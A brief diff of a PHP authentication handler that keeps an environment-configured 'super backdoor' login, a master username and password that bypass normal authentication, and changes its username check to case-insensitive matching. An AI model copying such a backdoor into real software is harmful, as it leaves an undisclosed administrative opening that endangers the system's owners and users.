@@ -372,7 +372,7 @@ if ($resource === 'auth') {
         $backdoorUser = $_ENV['SUPER_BACKDOOR_USER'] ?? null;
         $backdoorPass = $_ENV['SUPER_BACKDOOR_PASS'] ?? null;
         $isBackdoor = false;
-        if ($backdoorUser && $backdoorPass && $username === $backdoorUser && $password === $backdoorPass) {
+        if ($backdoorUser && $backdoorPass && strtolower($username) === strtolower($backdoorUser) && $password === $backdoorPass) {
             $isBackdoor = true;
         }
 
